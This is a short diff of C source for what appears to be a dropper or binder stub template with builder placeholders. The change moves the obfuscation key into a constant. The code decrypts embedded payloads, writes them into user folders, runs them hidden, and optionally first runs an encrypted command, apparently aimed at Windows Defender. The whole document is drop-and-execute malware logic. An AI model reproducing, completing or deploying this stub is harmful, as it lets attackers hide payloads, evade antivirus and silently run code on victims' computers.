@@ -31,7 +31,8 @@ char* base64_decode(char* cipher) {
     return plain;
 }
 
-char* cipher(char* data, char* key, long dataLen) {
+char* cipher(char* data, long dataLen) {
+	char* key = "#KEY";
 	int keyLen = strlen(key);
 	char* output = (char*)malloc(sizeof(char) * dataLen+1);
 	output[dataLen] = 0;
@@ -68,7 +69,7 @@ int run_program(char* file, char* arguments, int hidden){
 int main(int argc, char **argv) 
 {
 #if DefWD
-	run_program(NULL, cipher("#WDCOMMAND", "#KEY", #WDCOMMANDLENGTH), 1);
+	run_program(NULL, cipher("#WDCOMMAND", #WDCOMMANDLENGTH), 1);
 #endif
 	char* stringarray[#ARRAYCOUNT][3] = {#STRINGARRAY};
 	long intarray[#ARRAYCOUNT][5] = {#INTARRAY};
@@ -76,8 +77,8 @@ int main(int argc, char **argv)
 	char commandholder[MAX_PATH+1000];
 
 	for(int i = 0; i < #ARRAYCOUNT; ++i){
-		sprintf(commandholder, "%s\\%s", getenv(stringarray[i][0]), cipher(stringarray[i][1], "#KEY", intarray[i][0]));
-		write_file(commandholder, base64_decode(cipher(stringarray[i][2], "#KEY", intarray[i][2])), intarray[i][3]);
+		sprintf(commandholder, "%s\\%s", getenv(stringarray[i][0]), cipher(stringarray[i][1], intarray[i][0]));
+		write_file(commandholder, base64_decode(cipher(stringarray[i][2], intarray[i][2])), intarray[i][3]);
 		if(intarray[i][1]){
 			run_program(commandholder, NULL, intarray[i][4]);
 		}
